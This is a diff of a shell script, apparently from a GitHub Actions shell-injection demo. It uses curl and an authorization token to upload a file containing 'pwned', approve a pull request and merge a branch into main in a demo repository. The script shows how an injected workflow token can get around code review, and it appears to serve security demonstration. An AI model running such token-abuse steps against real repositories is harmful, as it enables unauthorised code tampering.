@@ -12,11 +12,11 @@ curl --request PUT \
   --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\", \"branch\": \"minusworld-gha-demo-patch-1\" }"
 
 # Create a PR
-curl --request POST \
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/pulls \
-  --header "Authorization: $authfield" \
-  --header "Accept: application/vnd.github.v3+json" \
-  --data '{ "title": "prt-demo", "head": "minusworld-gha-demo-patch-1", "base": "main" }'
+# curl --request POST \
+#   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/pulls \
+#   --header "Authorization: $authfield" \
+#   --header "Accept: application/vnd.github.v3+json" \
+#   --data '{ "title": "prt-demo", "head": "minusworld-gha-demo-patch-1", "base": "main" }'
 
 # Approve the PR
 curl --request POST \
@@ -25,3 +25,9 @@ curl --request POST \
   --header "Accept: application/vnd.github.v3+json" \
   --data '{ "event": "APPROVE" }'
 
+# Merge
+curl --request POST \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/merges \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json" \
+  --data '{ "base": "main", "head": "5130d3d9ebacade0f440e28af9395854ea8b9485" }'
